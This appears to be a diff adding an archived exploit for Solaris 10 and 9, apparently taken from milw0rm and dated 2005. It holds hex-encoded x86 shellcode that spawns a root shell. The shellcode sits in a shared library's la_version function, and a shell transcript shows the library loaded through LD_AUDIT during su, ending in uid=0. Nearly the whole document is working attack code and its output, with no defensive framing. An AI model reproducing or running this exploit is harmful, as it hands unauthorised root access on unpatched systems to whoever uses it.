@@ -1,0 +1,33 @@
+/*
+- SunOS 5.10 Generic i86pc i386 i86pc
+- SunOS 5.9 Generic_112233-12 sun4u
+
+It does NOT work on:
+
+SunOS 5.8 Generic_117350-02 sun4u sparc
+
+Example on unpatched Solaris 10 (AMD64):
+
+atari:venglin:~> cat dupa.c
+*/
+
+static char sh[] =
+"\x31\xc0\xeb\x09\x5a\x89\x42\x01\x88\x42\x06\xeb\x0d\xe8\xf2\xff\xff\xff\x9a\x01\x01\x01\x01\x07\x01\xc3\x50\xb0\x17\xe8\xf0\xff\xff\xff\x31\xc0\x68\x2f\x73\x68\x5f\x68\x2f\x62\x69\x6e\x88\x44\x24\x07\x89\xe3\x50\x53\x8d\x0c\x24\x8d\x54\x24\x04\x52\x51\x53\xb0\x0b\xe8\xcb\xff\xff\xff";
+
+int la_version() {
+       void (*f)();
+       f = (void*)sh;
+       f();
+       return 3;
+}
+
+/*
+atari:venglin:~> gcc -fPIC -shared -o /tmp/dupa.so dupa.c
+atari:venglin:~> setenv LD_AUDIT /tmp/dupa.so
+atari:venglin:~> su
+
+# id
+uid=0(root) gid=10(staff)
+*/
+
+// milw0rm.com [2005-06-28]
